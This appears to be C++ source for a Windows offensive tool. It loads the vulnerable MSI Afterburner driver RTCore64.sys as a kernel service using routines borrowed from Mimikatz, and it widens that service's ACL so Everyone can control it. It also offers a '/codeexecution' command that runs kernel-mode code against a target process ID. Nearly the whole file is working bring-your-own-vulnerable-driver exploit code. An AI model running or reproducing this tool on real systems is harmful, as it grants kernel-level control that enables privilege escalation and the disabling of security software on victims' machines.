#include <Windows.h>
#include <tchar.h>
#include <Aclapi.h>
#include "memory.h"
#include "kernelHelperUtil.h"

typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID BaseAddress,
	_In_ PVOID Buffer,
	_In_ ULONG NumberOfBytesToWrite,
	_Out_opt_ PULONG NumberOfBytesWritten
	);

typedef NTSTATUS(WINAPI* _NtReadVirtualMemory)(
	_In_ HANDLE               ProcessHandle,
	_In_ PVOID                BaseAddress,
	_Out_ PVOID               Buffer,
	_In_ ULONG                NumberOfBytesToRead,
	_Out_opt_ PULONG              NumberOfBytesReaded OPTIONAL
	);

//Mimikatz code to load / unload driver
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
		if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
			if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
				if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
					if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
	BOOL status = FALSE;
	SC_HANDLE hSC = NULL, hS = NULL;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
		if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
			wprintf(L"[+] \'%s\' service already registered\n", serviceName);
		}
		else {
			if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
				wprintf(L"[*] \'%s\' service not present\n", serviceName);
				if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
					wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
					if (status = kull_m_service_addWorldToSD(hS))
						wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
					else printf("kull_m_service_addWorldToSD");
				}
				else PRINT_ERROR_AUTO(L"CreateService");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if (hS) {
			if (startIt) {
				if (status = StartService(hS, 0, NULL))
					wprintf(L"[+] \'%s\' service started\n", serviceName);
				else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
					wprintf(L"[*] \'%s\' service already started\n", serviceName);
				else {
					PRINT_ERROR_AUTO(L"StartService");
				}
			}
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else {
		PRINT_ERROR_AUTO(L"OpenSCManager(create)");
		return GetLastError();
	}
	return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
	BOOL status = FALSE;
	SC_HANDLE hSC, hS;
	SERVICE_STATUS serviceStatus;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
			status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
	if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
		wprintf(L"[+] \'%s\' service stopped\n", serviceName);
	}
	else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
		wprintf(L"[*] \'%s\' service not running\n", serviceName);
	}
	else {
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
		return FALSE;
	}

	if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
			BOOL status = DeleteService(hS);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return TRUE;
}
// thanks gentilkiwi!

int main(int argc, char** argv) {

    if (argc < 2 || strcmp(argv[1] + 1, "help") == 0 ) {
        printf("Usage: %s\n"
            " /codeexecution processPID(In Decimal) - execute kernelmode routine\n"
            " /installDriver - Install the MSI driver\n"
            " /uninstallDriver - Uninstall the MSI driver\n"
            , argv[0]);
        return 0;
    }

    if (strcmp(argv[1] + 1, "installDriver") == 0) {
        const auto svcName = L"RTCore64";
        const auto svcDesc = L"Micro-Star MSI Afterburner";
        const wchar_t driverName[] = L"\\RTCore64.sys";
        const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
        TCHAR driverPath[pathSize];
        GetCurrentDirectory(pathSize, driverPath);
        wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

        if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
            wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
        }
        return 0;
    }
    else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
        const auto svcName = L"RTCore64";
        const auto svcDesc = L"Micro-Star MSI Afterburner";
        const wchar_t driverName[] = L"\\RTCore64.sys";
        const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
        TCHAR driverPath[pathSize];
        GetCurrentDirectory(pathSize, driverPath);
        wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));
        service_uninstall(svcName);
        return 0;
    }

    Memory m = Memory();
    kernelHelper helper = kernelHelper(&m);

    if (strcmp(argv[1] + 1, "codeexecution") == 0 && argc == 3) {
		DWORD64 pid = atoi(argv[2]);
		//Execute Kernel Code
		helper.codeExecution(pid);

    }
    else {
        wprintf(L"Error: Check the help\n");

    }
	return 0;
}